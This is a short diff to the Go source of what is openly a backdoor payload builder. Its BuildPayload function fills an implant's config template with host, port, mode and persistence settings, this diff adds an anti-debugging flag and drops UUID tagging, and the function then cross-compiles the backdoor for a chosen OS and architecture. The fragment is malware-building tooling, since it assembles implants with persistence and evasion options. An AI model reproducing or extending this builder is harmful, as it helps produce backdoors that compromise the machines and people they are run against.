@@ -6,11 +6,9 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
-
-	"github.com/google/uuid"
 )
 
-func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, enablePersistence bool) error {
+func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, enablePersistence, debug bool) error {
 	// Asegura que la carpeta destino exista
 	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
 		return fmt.Errorf(" No se pudo crear carpeta destino: %v", err)
@@ -33,6 +31,7 @@ func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, ena
 	content = strings.ReplaceAll(content, "{{PORT}}", port)
 	content = strings.ReplaceAll(content, "{{MODE}}", mode)
 	content = strings.ReplaceAll(content, "{{ENABLE_PERSISTENCE}}", fmt.Sprintf("%v", enablePersistence))
+	content = strings.ReplaceAll(content, "{{ANTI_DEBUG}}", fmt.Sprintf("%v", debug))
 
 	// Escribir config.go
 	err = os.WriteFile(configOutPath, []byte(content), 0644)
@@ -40,12 +39,9 @@ func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, ena
 		return fmt.Errorf(" Error escribiendo config.go: %v", err)
 	}
 
-	u := uuid.New().string()
-	var ldflags = fmt.Sprintf("-X ../../backdoor/config.UUID=%s", u)
-
 	// Configurar variables de entorno para la compilación''")
 	// Ejecutar build
-	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "main.go")
+	cmd := exec.Command("go", "build", "-o", outputPath, "main.go")
 	cmd.Dir = backdoorDir
 	cmd.Env = append(os.Environ(),
 		"GOOS="+targetOS,
